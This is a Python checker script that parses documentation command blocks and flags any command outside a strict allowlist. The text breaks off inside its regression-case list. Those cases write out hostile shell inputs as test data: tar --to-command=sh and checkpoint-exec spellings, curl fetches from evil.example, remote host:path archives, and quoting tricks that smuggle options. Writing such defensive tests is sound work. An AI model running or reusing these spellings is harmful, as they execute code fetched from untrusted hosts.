#!/usr/bin/env python3
"""Flag adopter-facing prose that instructs a command that is not `headwater`.

[HW-DR-0072](../../docs/decisions/0072-the-binary-is-the-only-interface-an-adopter-must-run-and-every-integration-point-outside-it-is-declared.md)
rules that an adopter reaches the whole governed loop through the binary,
that git plumbing is the one integration point the necessity test admits,
and that the list grows by a decision record and never by a script. Nothing
checked that boundary before #933: both real violations on record (#929,
the change manifest only `.githooks/change-manifest` could write; #930, the
bootstrap script presented as the only route) were found and fixed by hand,
and both sat in exactly the two documents a newcomer actually reads. This
script re-reads those two documents for the same shape, on the terms #933's
own Done-when states: it fails on a tree where adopter-facing prose
instructs a command that is not `headwater`.

**Every line of a command block is split into the pieces a shell would
actually run, and every piece is checked on its own.** A line is not one
command: `&&`, `||` and `;` sequence several, and `|` pipes one into
another, and a reader who pastes the line runs every piece the line names.
`cd tools && ./malicious-chain.sh` and `mkdir x; npm install` are two
commands apiece, and the second one of each is the one that matters. A
piece passes only if its leading word is `headwater`, or one of the
handful of ordinary shell verbs this repository's own commands already use
for scaffolding (`git`, `mkdir`, `cd`, `printf`, `rm`). The release
download passes through an allowlist of what the tutorial's block runs: a
`curl` passes only when every token is `-fsSLO` or a subset of it, or a URL
of a `.tar.gz` or `.tar.gz.sha256` under this project's `releases/download/`
path, and a `tar` passes only when every option is `-xzf` or a subset of
it, or `-C`. Every word must also be plain text the shell hands over
unchanged, with no quote, escape, brace or glob, and a tar operand names no
host. Anything else in either piece refuses it, because curl and GNU tar
both accept spellings a denylist does not name.

**The APT route passes through an allowlist of its own (#1230).** The
owner's ruling of 2026-09-29 amends HW-DR-0077 clause 1 to name `apt-get`,
`sudo`, `install`, `tee` and a `curl` of the APT keyring. `check_apt` admits
each one only in the shape the README's block runs: `apt-get update`,
`apt-get install -y` of the packages that block names, `install -d` of the
keyring directory, a `curl -o` of
`https://headwater.tools/apt/headwater-archive-keyring.asc` into
`/etc/apt/keyrings/`, an `echo` of a signed-by sources line for
`https://headwater.tools/apt`, and `tee` of one file under
`/etc/apt/sources.list.d/` only when that `echo` is what the pipe hands it.
`tee` writes whatever it is given, so a `printf` of an unsigned line piped
into it is refused. `sudo` passes only in front of one of those, so it is
never a way to run a program the route does not name.

**`cargo` is never the lead route.**
[HW-DR-0077](../../docs/decisions/0077-the-consumer-surface-is-what-an-adopter-receives-runs-and-must-have-installed-and-it-is-a-closed-and-declared-list.md)
makes no Rust toolchain mandatory, so the check is per document and in
order: `cargo` passes only in a block after one that already gave the
release download, and only in the README, which offers it as the labeled
alternative. The tutorial offers it in prose and never as a block, so there
it never passes. Where it passes it is still held to the two subcommands
this corpus runs, `install` and `build`: `cargo run --manifest-path
tools/evil/Cargo.toml` is `cargo`, but it is not either of those two, and a
subcommand allowlist is what a wholesale one misses. A line that contains
`$(`, a backtick, `<(` or `>(` fails outright and is never split further:
substitution can hide an arbitrary command inside an argument to an
otherwise-allowed one, and no piece of this corpus's real command blocks
ever needs it.

**No script this repository wrote is excused.** `tools/headwater-bootstrap.sh`
was, as a curl piped into a bare shell, until `headwater taxonomy vendor`
fetched a location itself (#1063). A page that still pipes that script, or
any other, into a shell now reports both pieces.

**Which blocks are commands is knowledge this script borrows rather than
re-derives.** `README.md` has no output blocks at all — every one of its
fenced blocks is a command block, so every block there is checked. The tutorial states
its own convention in *Before you start*: "A block is a command or it is
output, and the two look the same" — nothing marks the difference except
which order the page tells it in, so `drive.py`'s `COMMAND_BLOCK_INDICES`,
which `main()` now checks against what it actually ran before it exits, is
the one place that ordering is recorded, and this script imports it rather
than guessing a second time.

Run it through `.claude/tutorial/fixtures.sh`, or directly:
`python3 .claude/tutorial/adopter_interface.py <repo-root>`. Unlike
`drive.py`, it needs no built engine — it only reads two documents.
"""

import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import drive  # noqa: E402  (COMMAND_BLOCK_INDICES; see the module docstring above)

README = 'README.md'
TUTORIAL = drive.DOC

# Verbs this repository's own command blocks already use besides `headwater`
# itself, with no subcommand restriction: `git` (init, add, commit,
# checkout, clone, and a future `config`), `mkdir`/`cd` (scaffolding a fresh
# repository), `printf` (writing the seed document), `rm` (removing it
# again in step 8). `cargo` is handled separately, by subcommand.
# The piece `_pieces` yields in place of the rest of a block once a line
# ends inside a quote, a pair of backticks, a `$(` or a `${`, or closes one with
# the wrong `)` or `}`. The line number, counted from 1, follows it.
# `check_piece` never allows it, so the block fails.
UNREADABLE = ('unreadable: a quote, a pair of backticks, a $( or a ${ is still '
              'open, or a ) or } closes the wrong one, on block line ')

ALLOWED_LEADING_WORDS = frozenset({'headwater', 'git', 'mkdir', 'cd', 'printf', 'rm'})

# `cargo` passes only for the subcommands this corpus's real command blocks
# actually run. `cargo run --manifest-path <anything>` compiles and executes
# arbitrary code from wherever that manifest points, which a wholesale
# allowance for the verb `cargo` would let through.
CARGO_ALLOWED_SUBCOMMANDS = frozenset({'install', 'build'})

# The release download, as an allowlist of what the tutorial's own block
# runs and nothing more. A denylist cannot hold either verb: curl fetches an
# operand with no scheme and takes `--next`, `--expand-url` and a URL glob,
# and GNU tar accepts any unambiguous prefix of a long option and reads its
# first operand as old-style options (the verifier's attack on PR #1128).
#
# `curl`: every token is either a short-option cluster drawn from
# `CURL_ALLOWED_SHORT` or a URL that `RELEASE_DOWNLOAD_URL` matches in full.
# No long option, no bare operand, no percent-encoding, no glob and no `..`.
RELEASE_DOWNLOAD_URL = re.compile(
    r'^https://github\.com/headwater-ai/headwater/releases/download/'
    r'[A-Za-z0-9][A-Za-z0-9._-]*/[A-Za-z0-9][A-Za-z0-9._-]*\.tar\.gz(\.sha256)?$')
CURL_ALLOWED_SHORT = frozenset('fsSLO')

# `tar`: the first operand is a dash cluster drawn from `TAR_ALLOWED_SHORT`,
# every later dash token is such a cluster or `-C`, and no long option is
# admitted. A bare token is a file or member operand.
TAR_ALLOWED_SHORT = frozenset('xzf')

# Every word of a `curl` or `tar` piece is read as the text the shell will
# hand the program, so a word must be one whose text the shell leaves alone:
# no quote, backslash, brace, glob character, `$`, `=` or `@`, and a `~`
# only at its start, where it expands to a home directory. Anything else is
# refused rather than unquoted by hand here, because a second shell parser
# is what the verifier's quoted `--to-command` spellings got past. A tar
# operand also carries no `:`, which GNU tar reads as `host:path`, a remote
# archive. The release URL is matched on its own by `RELEASE_DOWNLOAD_URL`,
# whose character class admits none of these either.
PLAIN_WORD = re.compile(r'^~?[A-Za-z0-9._/-]+$')

# Command substitution: `$(...)`, a backtick pair, or process substitution.
# Any of these can hide an arbitrary command inside an argument to a piece
# that otherwise reads as allowed, and no real command block in either
# document ever needs one.
SUBSTITUTION = re.compile(r'\$\(|`|<\(|>\(')

# The APT route (#1230). The owner's ruling of 2026-09-29 amends HW-DR-0077
# clause 1 to name `apt-get`, `sudo`, `install`, `tee` and one `curl` of the
# keyring. Each passes here only in the shape the README's block runs, as an
# allowlist in the manner of the curl and tar arms above, so `sudo` is never a
# way to run a program the route does not name, and no piece writes outside
# `/etc/apt/`.
APT_KEYRING_URL = 'https://headwater.tools/apt/headwater-archive-keyring.asc'
APT_KEYRING_PATH = re.compile(r'^/etc/apt/keyrings/[A-Za-z0-9_-][A-Za-z0-9._-]*\.asc$')
APT_KEYRING_DIR = '/etc/apt/keyrings'
APT_SOURCES_PATH = re.compile(
    r'^/etc/apt/sources\.list\.d/[A-Za-z0-9_-][A-Za-z0-9._-]*\.list$')
APT_PACKAGES = frozenset({'headwater', 'ca-certificates', 'curl'})
APT_SOURCES_ECHO = re.compile(
    r'^echo "deb \[signed-by=/etc/apt/keyrings/[A-Za-z0-9_-][A-Za-z0-9._-]*\.asc\] '
    r'https://headwater\.tools/apt [a-z0-9-]+( [a-z0-9-]+)+"$')
SUDO_ALLOWED = frozenset({'apt-get', 'install', 'curl', 'tee'})


def parse_fenced_blocks(text):
    """Every fenced code block's content, in document order.

    Mirrors `drive.py`'s `read_blocks`: front matter is stripped first so
    that a `---` a document merely quotes (front matter shown inside a
    fence) never reads as a second document boundary, and a fence is
    matched with `drive.FENCE_MARKER` — three or more backticks or tildes,
    with an info string allowed after the opening one — rather than a bare
    ` ``` ` equality, so a block an author opens with ` ```sh ` is not
    invisible to this scan, and its closing fence does not flip the
    command/output parity of every block that follows it.
    """
    lines = text.split('\n')
    if lines and lines[0] == '---':
        lines = lines[lines.index('---', 1) + 1:]
    blocks, current, inside = [], [], False
    for line in lines:
        if drive.FENCE_MARKER.match(line.strip()):
            if inside:
                blocks.append('\n'.join(current))
                current = []
            inside = not inside
            continue
        if inside:
            current.append(line)
    return blocks


def fenced_blocks(path):
    """`parse_fenced_blocks`, reading its text from a file on disk."""
    if not os.path.isfile(path):
        raise SystemExit(f'adopter interface: no such document: {path}')
    return parse_fenced_blocks(open(path).read())


def _split_unquoted(text, is_boundary):
    """Split `text` at every point `is_boundary(text, i)` accepts, except
    inside a single- or double-quoted span.

    `is_boundary` is called with the full string and an index, and returns
    the number of characters the boundary consumes (0 where none starts
    there). Shared by the chain split (`&&`, `||`, `;`) and the pipe split
    (`|`), so a quoted argument that happens to hold one of those
    characters — `printf`'s literal string is the one line in this corpus
    that could otherwise be cut in half — is never split.

    A backslash outside single quotes escapes the character after it, as
    the engine's own splitter (`engine/crates/check/src/command.rs`,
    `segments`) and a shell both read it: `printf a\\' && npm install`
    opens no quoted span, so the chained command is still split out.
    Inside single quotes a backslash is literal.
    """
    pieces = _scan(text, is_boundary)[0]
    return [p.strip() for p in pieces if p.strip()]


def _scan(text, is_boundary):
    """The pieces `_split_unquoted` cuts, and what stops `text` from ending
    cleanly: the innermost span still open (`'`, `"`, `$'`, a backtick, `$(`
    or `${`), `!` for a `)` or `}` that closes a span of the other kind, or
    None. A comment ends the text cleanly.

    The engine's `scan` in `engine/crates/check/src/command.rs` reads one
    command by the same rules, with one stack of open spans. Each span closes
    only the span of its own kind at the top of the stack. A `)` or `}` that
    meets a `${` or a `$(` of the other kind at the top closes nothing: the
    scan stops, the rest of the text stays in the last piece, and `!` flags
    it. Inside single quotes nothing is special but the closing quote. Inside
    `$'…'` and backticks a backslash escapes the next character and no quote
    opens. Inside double quotes a backslash escapes, and `$(`, `${` and
    backticks open. A `#` opens a comment only when no span is open, at the
    start of the text or after a blank, `;`, `&` or `|`, and the comment is
    no part of a piece. A boundary splits the text only when no quote is
    open.
    """
    pieces, buf, stack, i = [], [], [], 0
    while i < len(text):
        ch, top = text[i], (stack[-1] if stack else None)
        nxt = text[i + 1:i + 2]
        quoted = any(span in ("'", '"', "$'") for span in stack)
        if top == "'":
            if ch == "'":
                stack.pop()
            buf.append(ch)
            i += 1
            continue
        if ch == '\\':
            buf.append(text[i:i + 2])
            i += 2
            continue
        if top == "$'":
            if ch == "'":
                stack.pop()
            buf.append(ch)
            i += 1
            continue
        if (top == '`' and ch == '`') or (top == '"' and ch == '"'):
            stack.pop()
            buf.append(ch)
            i += 1
            continue
        if top in (None, '$(', '${', '`', '"') and ch == '$' and nxt in ('(', '{'):
            stack.append('$' + nxt)
            buf.append(ch + nxt)
            i += 2
            continue
        if top in (None, '$(', '${', '"') and ch == '`':
            stack.append('`')
            buf.append(ch)
            i += 1
            continue
        if top == '"':
            buf.append(ch)
            i += 1
            continue
        code = top in (None, '$(', '${')
        if code and ch == '$' and nxt == "'":
            stack.append("$'")
            buf.append("$'")
            i += 2
            continue
        if code and ch in ("'", '"'):
            stack.append(ch)
            buf.append(ch)
            i += 1
            continue
        if (top, ch) in (('$(', ')'), ('${', '}')):
            stack.pop()
            buf.append(ch)
            i += 1
            continue
        if top in ('$(', '${') and ch in (')', '}'):
            buf.append(text[i:])
            pieces.append(''.join(buf))
            return pieces, '!'
        if top is None and ch == '#' and (i == 0 or text[i - 1] in ' \t;&|'):
            break
        consumed = 0 if quoted else is_boundary(text, i)
        if consumed:
            pieces.append(''.join(buf))
            buf = []
            i += consumed
            continue
        buf.append(ch)
        i += 1
    pieces.append(''.join(buf))
    return pieces, (stack[-1] if stack else None)


def split_chain(line):
    """The top-level sequencing, conditional and backgrounding operators
    split a line into the commands a shell actually runs: `&&`, `||`, `;`,
    and a bare `&`. A single `&` backgrounds the command before it and
    starts the next one immediately rather than waiting on it, which is a
    weaker guarantee than `&&` gives but still runs both — `git clone <url>
    & sh tools/evil.sh` runs the script exactly as `git clone <url> && sh
    tools/evil.sh` does, so the two-character check for `&&` above must
    come first, or a real `&&` would be split as if it named two bare `&`."""
    def boundary(text, i):
        if text[i:i + 2] in ('&&', '||'):
            return 2
        if text[i] in (';', '&'):
            return 1
        return 0
    return _split_unquoted(line, boundary)


def split_pipe(segment):
    """A single `|` splits one command's output into the next command's
    input — two pieces, each checked as its own command."""
    def boundary(text, i):
        return 1 if text[i] == '|' else 0
    return _split_unquoted(segment, boundary)


def is_release_download(piece):
    """Whether `piece` is a `curl` that fetches from this project's release
    downloads and from nowhere else.

    An allowlist: every token after `curl` is a short-option cluster drawn
    from `CURL_ALLOWED_SHORT`, or a URL that `RELEASE_DOWNLOAD_URL` matches
    in full with no `..` in it, and at least one token is such a URL. Any
    other token, a scheme-less operand or a long option among them, refuses
    the piece."""
    tokens = piece.split()
    if not tokens or tokens[0] != 'curl' or SUBSTITUTION.search(piece):
        return False
    urls = 0
    for token in tokens[1:]:
        if token.startswith('-') and not token.startswith('--'):
            if (len(token) < 2 or not PLAIN_WORD.match(token)
                    or not set(token[1:]) <= CURL_ALLOWED_SHORT):
                return False
        elif RELEASE_DOWNLOAD_URL.match(token) and '..' not in token:
            urls += 1
        else:
            return False
    return urls > 0


def check_tar(tokens):
    """Whether a `tar` piece only unpacks, as an allowlist: the first
    operand is a dash cluster drawn from `TAR_ALLOWED_SHORT`, so it is never
    read as old-style options. Every later dash token is such a cluster or
    `-C`. No long option passes, whatever prefix of one it spells. Every
    word is a `PLAIN_WORD`, so no quoting, escaping or expansion can turn a
    word this reads as an operand into an option, and no operand names a
    host."""
    def cluster(token):
        return (token.startswith('-') and not token.startswith('--')
                and len(token) > 1 and set(token[1:]) <= TAR_ALLOWED_SHORT)
    if len(tokens) < 2 or not cluster(tokens[1]):
        return False
    for token in tokens[2:]:
        if not PLAIN_WORD.match(token):
            return False
        if token.startswith('-') and token != '-C' and not cluster(token):
            return False
    return True


def check_apt(tokens, piece, upstream=()):
    """Whether a piece is one of the APT route's commands, in the shape the
    README runs it and in no other (#1230). `tokens` has no `sudo` in front.

    - `apt-get update`, alone; `apt-get install` with `-y` and packages
      from `APT_PACKAGES`. No `-o`, which sets any configuration option.
    - `install -d -m 0755 /etc/apt/keyrings`: it makes that directory,
      copies nothing, and leaves it writable by root alone.
    - `tee <file>` with one operand under `/etc/apt/sources.list.d/`, and
      only as the second of two pieces whose first is the sources `echo`
      below. `tee` writes whatever it is handed, so the file it names is
      half of what it does and its input is the other half.
    - `curl` with short options from `fsSL`, `-o` naming a path under
      `/etc/apt/keyrings/`, and `APT_KEYRING_URL` as the only URL.
    - `echo "deb [signed-by=<keyring>] https://headwater.tools/apt ..."`,
      unquoted by nothing and redirected nowhere.

    Every argument is compared with an exact value or a pattern anchored at
    both ends, and no pattern admits a `/` after its directory, so no path
    climbs out with `..`."""
    if not tokens:
        return False
    head = tokens[0]
    if head == 'echo':
        return bool(APT_SOURCES_ECHO.match(piece.strip()))
    if head == 'apt-get':
        if tokens[1:] == ['update']:
            return True
        if len(tokens) < 3 or tokens[1] != 'install':
            return False
        packages = [t for t in tokens[2:] if t != '-y']
        return bool(packages) and set(packages) <= APT_PACKAGES
    if head == 'install':
        return (len(tokens) == 5 and tokens[1] == '-d' and tokens[2] == '-m'
                and tokens[3] in ('0755', '755')
                and tokens[4] == APT_KEYRING_DIR)
    if head == 'tee':
        return (len(tokens) == 2 and APT_SOURCES_PATH.match(tokens[1]) is not None
                and len(upstream) == 1
                and APT_SOURCES_ECHO.match(upstream[0].strip()) is not None)
    if head == 'curl':
        rest, url, out = tokens[1:], 0, 0
        i = 0
        while i < len(rest):
            t = rest[i]
            if t == '-o' and i + 1 < len(rest) and APT_KEYRING_PATH.match(rest[i + 1]):
                out += 1
                i += 2
                continue
            if t == APT_KEYRING_URL:
                url += 1
            elif not (t.startswith('-') and len(t) > 1
                      and set(t[1:]) <= frozenset('fsSL')):
                return False
            i += 1
        return url == 1 and out == 1
    return False


def check_sudo(tokens, piece, upstream=()):
    """`sudo` passes only in front of an APT-route program in its APT
    shape, and with no option of its own."""
    if len(tokens) < 2 or tokens[1] not in SUDO_ALLOWED:
        return False
    return check_apt(tokens[1:], piece.split(None, 1)[1], upstream)


def check_piece(piece, cargo_allowed=False, upstream=()):
    """Whether one already-split piece is an allowed command.

    `cargo` passes only when `cargo_allowed` is set, which
    `undeclared_in_document` does only after the document has already
    given the release download. `upstream` is the pieces before this one in
    its pipeline, which the APT arm's `tee` reads."""
    if piece.startswith(UNREADABLE) or SUBSTITUTION.search(piece):
        return False
    tokens = piece.split()
    if not tokens:
        return True
    if tokens[0] == 'cargo':
        return (cargo_allowed and len(tokens) > 1
                and tokens[1] in CARGO_ALLOWED_SUBCOMMANDS)
    if tokens[0] == 'sudo':
        return check_sudo(tokens, piece, upstream)
    if tokens[0] == 'curl':
        return is_release_download(piece) or check_apt(tokens, piece)
    if tokens[0] == 'tar':
        return check_tar(tokens)
    if tokens[0] in ('apt-get', 'install', 'tee', 'echo'):
        return check_apt(tokens, piece, upstream)
    return tokens[0] in ALLOWED_LEADING_WORDS


def _piped_pieces(block):
    """Every piece of every line of a command block, one line at a time,
    each with the list of pieces that come before it in its own pipeline.

    A line that ends inside a quote, a pair of backticks, a `$(` or a `${` joins
    nothing (#1135). Its pieces are yielded, then one `UNREADABLE` piece that
    names the line, and nothing after it: a checker that joined such a line
    would have to lex the shell, and each construct it misread would hide
    the lines after it rather than flag them. No here-document body is
    skipped, so a body line is read as a command and fails closed.
    """
    for number, line in enumerate(block.split('\n'), start=1):
        stripped = line.strip()
        if not stripped or stripped.startswith('#'):
            continue
        for segment in split_chain(stripped):
            pipeline = split_pipe(segment)
            for i, piece in enumerate(pipeline):
                yield piece, pipeline[:i]
        if _scan(stripped, lambda _t, _i: 0)[1]:
            yield UNREADABLE + str(number), []
            return


def _pieces(block):
    """Every piece of every line of a command block, as `_piped_pieces`
    yields them, without what feeds each one."""
    return (piece for piece, _ in _piped_pieces(block))


def undeclared_pieces(block, cargo_allowed=False):
    """Every piece of every line of a command block that is not allowed."""
    return [p for p, upstream in _piped_pieces(block)
            if not check_piece(p, cargo_allowed, upstream)]


def undeclared_in_document(blocks, cargo_may_follow_download):
    """Every piece that is not allowed across a document's command blocks,
    in order.

    HW-DR-0077 makes no Rust toolchain mandatory: the release download
    leads, and `cargo install` is a labeled alternative after it. So
    `cargo` passes only in a block that follows one which already gave the
    download, and only where `cargo_may_follow_download` is set. The README
    sets it. The tutorial does not, because its install section names the
    alternative in prose and never as a block."""
    failures, download_seen = [], False
    for block in blocks:
        failures += undeclared_pieces(
            block, cargo_allowed=cargo_may_follow_download and download_seen)
        if any(is_release_download(p) for p in _pieces(block)):
            download_seen = True
    return failures


# The README's APT block as it stands on the day the arm landed (#1230).
APT_BLOCK = (
    'sudo apt-get update\n'
    'sudo apt-get install -y ca-certificates curl\n'
    'sudo install -d -m 0755 /etc/apt/keyrings\n'
    'sudo curl -fsSL -o /etc/apt/keyrings/headwater-archive-keyring.asc '
    'https://headwater.tools/apt/headwater-archive-keyring.asc\n'
    'echo "deb [signed-by=/etc/apt/keyrings/headwater-archive-keyring.asc] '
    'https://headwater.tools/apt stable main" | sudo tee /etc/apt/sources.list.d/headwater.list\n'
    'sudo apt-get update\n'
    'sudo apt-get install -y headwater\n'
    'headwater --version')

# Regression cases: every attack shape a verifier has raised against this
# check, held here so a future edit that reopens one of them fails a run of
# `fixtures.sh` on its own, rather than waiting for another round of attack.
# Each entry is (label, block text, the exact undeclared pieces expected).
REGRESSION_CASES = [
    ('a bare undeclared command',
     'npm install',
     ['npm install']),
    ('an undeclared script beside a mention of the retired bootstrap script',
     'tools/malicious-script.sh --do-it\n'
     '# see tools/headwater-bootstrap.sh for comparison',
     ['tools/malicious-script.sh --do-it']),
    ('an undeclared script chained with &&',
     'cd tools && ./malicious-chain.sh --do-it',
     ['./malicious-chain.sh --do-it']),
    ('an undeclared command chained with ;',
     'mkdir x; npm install',
     ['npm install']),
    ('an undeclared script chained with && after git',
     'git clone https://example.com/repo.git && sh tools/y.sh',
     ['sh tools/y.sh']),
    ('cargo allowed only for install/build, not by verb alone',
     'cargo run --manifest-path tools/evil/Cargo.toml',
     ['cargo run --manifest-path tools/evil/Cargo.toml']),
    ('a command chained onto a curl of the retired bootstrap script',
     'curl -fsSL https://raw.githubusercontent.com/headwater-ai/headwater/'
     'main/tools/headwater-bootstrap.sh | sh -s -- --tag x --expect y '
     '&& npm install',
     ['curl -fsSL https://raw.githubusercontent.com/headwater-ai/headwater/'
      'main/tools/headwater-bootstrap.sh',
      'sh -s -- --tag x --expect y',
      'npm install']),
    ('an undeclared script backgrounded with a bare &',
     'git clone https://example.com/repo.git & sh tools/evil.sh',
     ['sh tools/evil.sh']),
    ('a curl of the retired bootstrap script piped into sh is undeclared',
     'curl -fsSL https://raw.githubusercontent.com/headwater-ai/headwater/'
     'main/tools/headwater-bootstrap.sh | sh -s -- --tag '
     'taxonomy/headwater-standard/v4.2.0 --expect sha256:961ecf2ae2c3c74',
     ['curl -fsSL https://raw.githubusercontent.com/headwater-ai/headwater/'
      'main/tools/headwater-bootstrap.sh',
      'sh -s -- --tag taxonomy/headwater-standard/v4.2.0 '
      '--expect sha256:961ecf2ae2c3c74']),
    ('a backslash-escaped quote opens no quoted span to hide a chain in',
     "printf a\\' && npm install",
     ['npm install']),
    ('a backslash inside single quotes is literal and closes nothing',
     "printf 'a\\' && npm install",
     ['npm install']),
    ('an escaped double quote inside double quotes does not close the span',
     'printf "a\\" && b" && npm install',
     ['npm install']),
    ('cargo install, alone in a block, is undeclared: no toolchain is '
     'mandatory (HW-DR-0077)',
     'cargo install headwater-cli',
     ['cargo install headwater-cli']),
    ('the release download is not undeclared',
     'mkdir -p ~/.local/bin\n'
     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
     'v0.2.1/headwater-v0.2.1-x86_64-unknown-linux-musl.tar.gz\n'
     'tar -xzf headwater-v0.2.1-x86_64-unknown-linux-musl.tar.gz -C ~/.local/bin headwater',
     []),
    ('curl is not declared by verb alone: a URL outside the release '
     'downloads is undeclared',
     'curl -fsSLO https://example.com/evil.tar.gz',
     ['curl -fsSLO https://example.com/evil.tar.gz']),
    ('curl naming a release download and a second URL is undeclared',
     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
     'v0.2.1/x.tar.gz -O https://example.com/evil.sh',
     ['curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
      'v0.2.1/x.tar.gz -O https://example.com/evil.sh']),
    ('curl climbing out of the release downloads with .. is undeclared',
     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
     '../../../evil/raw/main/x.sh',
     ['curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
      '../../../evil/raw/main/x.sh']),
    ('curl reading its URLs from a config file is undeclared',
     'curl -K evil.cfg https://github.com/headwater-ai/headwater/releases/download/'
     'v0.2.1/x.tar.gz',
     ['curl -K evil.cfg https://github.com/headwater-ai/headwater/releases/download/'
      'v0.2.1/x.tar.gz']),
    ('tar handing each member to a command is undeclared',
     'tar -xzf x.tar.gz --to-command=sh',
     ['tar -xzf x.tar.gz --to-command=sh']),
    ('tar running a checkpoint action is undeclared',
     'tar -xzf x.tar.gz --checkpoint=1 --checkpoint-action=exec=sh',
     ['tar -xzf x.tar.gz --checkpoint=1 --checkpoint-action=exec=sh']),
    ('tar with its own decompressor program is undeclared',
     'tar -I ./evil -xf x.tar',
     ['tar -I ./evil -xf x.tar']),
    # The verifier's spellings on PR #1128. curl fetches an operand with no
    # scheme, and GNU tar accepts any unambiguous prefix of a long option and
    # reads its first operand as old-style options, so a denylist of exact
    # names and of `://` tokens held none of these.
    ('curl with a second operand that names no scheme is undeclared',
     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
     'v0.2.1/x.tar.gz evil.example/x.sh',
     ['curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
      'v0.2.1/x.tar.gz evil.example/x.sh']),
    ('curl --next with a second transfer is undeclared',
     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
     'v0.2.1/x.tar.gz --next -O evil.example/x.sh',
     ['curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
      'v0.2.1/x.tar.gz --next -O evil.example/x.sh']),
    ('curl expanding a variable into a URL is undeclared',
     'curl --variable u=evil.example/p --expand-url {{u}} '
     'https://github.com/headwater-ai/headwater/releases/download/v0.2.1/x.tar.gz',
     ['curl --variable u=evil.example/p --expand-url {{u}} '
      'https://github.com/headwater-ai/headwater/releases/download/v0.2.1/x.tar.gz']),
    ('curl climbing out with an encoded dot segment is undeclared',
     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
     '%2e%2e/%2e%2e/evil/x.sh',
     ['curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
      '%2e%2e/%2e%2e/evil/x.sh']),
    ('curl with a URL glob is undeclared',
     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
     'v0.2.1/{x.tar.gz,y}',
     ['curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
      'v0.2.1/{x.tar.gz,y}']),
    ('tar with an abbreviated --to-command is undeclared',
     'tar --to-comm=sh -xzf x.tar.gz',
     ['tar --to-comm=sh -xzf x.tar.gz']),
    ('tar with an abbreviated --checkpoint-action is undeclared',
     'tar -xzf x.tar.gz --checkpoint=1 --checkpoint-act=exec=sh',
     ['tar -xzf x.tar.gz --checkpoint=1 --checkpoint-act=exec=sh']),
    ('tar with an abbreviated --use-compress-program is undeclared',
     'tar --use-compress-prog=sh -xf x.tar.gz',
     ['tar --use-compress-prog=sh -xf x.tar.gz']),
    ('tar with old-style options in its first operand is undeclared',
     'tar xIf sh a.tar.gz',
     ['tar xIf sh a.tar.gz']),
    ('tar with an option cluster outside the one the tutorial runs is undeclared',
     'tar -xzvf x.tar.gz -K member',
     ['tar -xzvf x.tar.gz -K member']),
    # The second verify on PR #1128. The check reads words before the shell
    # removes quotes and expands braces, so a word whose text is not plain
    # is refused outright rather than guessed at. A `host:path` archive is a
    # remote archive to GNU tar.
    ('tar with a double-quoted long option is undeclared',
     'tar -xzf a.tar.gz "--to-command=sh"',
     ['tar -xzf a.tar.gz "--to-command=sh"']),
    ('tar with a single-quoted long option is undeclared',
     "tar -xzf a.tar.gz '--to-command=sh'",
     ["tar -xzf a.tar.gz '--to-command=sh'"]),
    ('tar with a backslash before a long option is undeclared',
     'tar -xzf a.tar.gz \\--to-command=sh',
     ['tar -xzf a.tar.gz \\--to-command=sh']),
    ('tar with an empty quoted prefix before a long option is undeclared',
     "tar -xzf a.tar.gz ''--to-command=sh",
     ["tar -xzf a.tar.gz ''--to-command=sh"]),
    ('tar with a brace expansion that yields a long option is undeclared',
     'tar -xzf a.tar.gz {--to-command=sh,x}',
     ['tar -xzf a.tar.gz {--to-command=sh,x}']),
    ('tar reading a remote archive from host:path is undeclared',
     'tar -xzf evil.example:/x.tar.gz',
     ['tar -xzf evil.example:/x.tar.gz']),
    ('tar reading a remote archive from user@host:path is undeclared',
     'tar -xzf user@evil.example:x.tar.gz',
     ['tar -xzf user@evil.example:x.tar.gz']),
    ('tar with -- ending its options before a long option is undeclared',
     'tar -xzf a.tar.gz -- --to-command=sh',
     ['tar -xzf a.tar.gz -- --to-command=sh']),
    ('tar with an attached -C value is undeclared',
     'tar -xzf a.tar.gz -C/tmp',
     ['tar -xzf a.tar.gz -C/tmp']),
    ('tar reading its archive from standard input is undeclared',
     'tar -xzf -',
     ['tar -xzf -']),
    ('curl fetching a release file that is not an archive or its checksum '
     'is undeclared',
     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
     'v1/.bashrc',
     ['curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
      'v1/.bashrc']),
    ('the checksum download is not undeclared',
     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
     'v0.2.1/headwater-v0.2.1-x86_64-unknown-linux-musl.tar.gz.sha256',
     []),
    ('curl with a quoted release URL is undeclared',
     'curl -fsSLO "https://github.com/headwater-ai/headwater/releases/download/'
     'v0.2.1/x.tar.gz"',
     ['curl -fsSLO "https://github.com/headwater-ai/headwater/releases/download/'
      'v0.2.1/x.tar.gz"']),
    ('the macOS install line is not undeclared',
     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
     'v0.2.1/headwater-v0.2.1-aarch64-apple-darwin.tar.gz\n'
     'tar -xzf headwater-v0.2.1-aarch64-apple-darwin.tar.gz -C ~/.local/bin headwater',
     []),
    ('step 1 scaffolding is not undeclared',
     'mkdir -p ~/headwater-tutorial/docs/decisions\n'
     'cd ~/headwater-tutorial\n'
     'git init\n'
     "printf '# Store attempts in Postgres' > docs/decisions/postgres-note.md",
     []),
    # #1135, and the parent's ruling on #1195: a line that ends inside a
    # quote joins nothing. What the line runs before the quote is read, and
    # the rest of the block is reported as unreadable (rule 1).
    ('a single quote open at the end of a line leaves the rest of the block '
     'unreadable',
     "printf 'a\nheadwater check' && echo RAN-2 && printf 'b'",
     [UNREADABLE + '1']),
    ('an ANSI-C quote open at the end of a line leaves the rest unreadable',
     "printf $'a\nheadwater check' && echo RAN && printf 'b'",
     [UNREADABLE + '1']),
    ('an open pair of backticks leaves the rest unreadable',
     'echo `date\nnpm install',
     ['echo `date', UNREADABLE + '1']),
